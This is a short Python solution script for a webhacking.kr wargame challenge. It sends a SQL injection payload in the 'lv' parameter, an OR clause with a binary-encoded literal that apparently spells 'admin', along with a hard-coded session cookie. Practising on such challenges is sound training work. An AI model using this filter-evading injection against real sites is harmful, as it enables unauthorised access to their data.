import requests

url = 'https://webhacking.kr/challenge/web-23/'
params = {'lv':'0||(id=0b0110000101100100011011010110100101101110)'}
cookies = {'PHPSESSID':'hgag9kj1ags7cm627r5mqleubf'}
res = requests.get(url, params = params, cookies = cookies)
print(res.text)

